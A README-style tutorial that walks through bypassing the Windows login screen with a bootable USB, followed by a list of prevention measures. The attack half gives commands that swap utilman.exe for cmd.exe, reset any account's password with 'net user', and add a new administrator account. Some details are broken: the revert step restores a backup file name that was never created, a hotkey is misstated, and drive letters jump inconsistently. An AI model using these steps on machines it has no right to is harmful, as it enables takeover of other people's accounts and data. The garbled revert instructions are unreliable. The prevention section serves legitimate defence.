<h1 align="center">Windows Login Bypass and Prevention</h1>


## Explaination
We are trying to access CMD so that we can change the Username, Password without Logging in. So, We used Bootable USB: As we can access temporary CMD from there and there is also a way in Windows 10 via Troubleshooting but that's not possible for all Window User.

So after opening CMD we perform some steps like searching for System Files present in our main computer by checking each drive then after searching we go to the System32 Folder and there we contain our utilman.exe and cmd.exe File. So we make a copy of utilman.exe and then changed utilman.exe as cmd.exe. As if we execute utilman.exe file, then cmd.exe will get executed. And utilman.exe is one and only ""Ease of Access"" which is present at the bottom right in Windows. So, after changing that and starting our Windows normally. We can click ""Ease of Access"" and cmd.exe will get executed and we can use out short script for which we were waiting for.

net user username password -> this will change out password for particular account without any problem.

## Requirement

A Computer, Bootable USB for Windows 10

## Steps

1. Restart and boot from Pendrive and after Install Screen appears then hit Shift + 10 and CMD will open up.

2. X: \Sources>
```bash
wmic logicaldisk get name
```

Output:
    Name
    C:
    D:
    E:
    X:


3. X: \Sources>
```bash
C:
#the directory which comtains your system files
```


4. C: \>
```bash
dir
```

Output:
Volume in drive C is System Reserved
Volume Serial Number is 56E1-426F

Directory of C:\
    File Not Found


5. E: \>
```bash
D:
```


6. D: \>
```bash
cd Windows
```


7. D: \Windows>
```bash
cd System32
```


8. D: \Windows\System32>
```bash
ren utilman.exe utilman2.exe
```


9. D: \Windows\System32>
```bash
copy cmd.exe utilman.exe
```


10. Click Ease of Access - cmd will open

11. net user username password


<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/01.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/02.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/03.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/04.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/05.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/06.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/07.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/08.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/09.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/10.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/11.jpg" />

<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/12.jpg" />


## Creating a New User Account

To create a new user account in the Command Prompt (Username: `NewGuy`, Password: `abc123`), and add them to the Administrators usergroup, use the following commands:

```bash
net user NewGuy abc123 /add
net localgroup Administrators NewGuy /add
```

You should be able to log in immediately with this new account.


## Reverting Changes

To restore utilman.exe, in the Command Prompt, type the following:

C:>
```bash
cd windows\system32
del utilman.exe
ren utilman.exe.bak utilman.exe
```


Then, reboot the system.
To remove the new user account you created earlier, type the following:

```bash
net user NewGuy /delete
```




## Prevention: Protecting Your System

To prevent people from bypassing your Windows password using Command Prompt (CMD) or other methods, you can implement several security measures. Here are some effective strategies:

### **1. Enable Local Security Policies:**

Use the Local Security Policy editor to enforce strong password policies.
* Press Windows + R, type `secpol.msc`, and press Enter.
* Navigate to Local Policies > Security Options and adjust settings like:
    * Accounts: Administrator account status (disable if not needed)
    * Accounts: Guest account status (disable)

### **2. Disable Command Prompt Access:**

You can restrict access to CMD for standard users.
* Press Windows + R, type `gpedit.msc`, and press Enter.
* Navigate to User Configuration > Administrative Templates > System.
* Find the policy "Prevent access to the command prompt" and set it to Enabled.

### **3. Use User Account Control (UAC):**

Ensure UAC is enabled to prevent unauthorized changes.
* Go to Control Panel > User Accounts > Change User Account Control settings and set it to the highest level.

### **4. Limit Administrator Privileges:**

Ensure that users do not have administrative privileges unless necessary.
* Create standard user accounts for daily use and reserve admin accounts for administrative tasks.

### **5. Use BitLocker Encryption:**

Encrypt your drives with BitLocker to protect data.
* Go to Control Panel > System and Security > BitLocker Drive Encryption and enable it for your drives.

### **6. Keep Your System Updated:**

Regularly update Windows to patch vulnerabilities.
* Go to Settings > Update & Security > Windows Update and check for updates.

### **7. Use Strong Passwords:**

Ensure that all user accounts have strong, complex passwords.
* Consider implementing a password manager to generate and store complex passwords.

### **8. Monitor Account Access:**

Enable audit logging to monitor account access and changes.
* In the Local Security Policy, navigate to Local Policies > Audit Policy and enable auditing for logon events.

### **9. Disable Boot from External Devices:**

Prevent users from booting from USB or external drives.
* Access BIOS/UEFI settings during boot and adjust boot order or disable USB booting.


<img width="931" alt="image" src="https://github.com/may-sec/Projects/blob/main/Windows%20Login%20Bypass%20and%20Prevention/pics/13.jpg" />
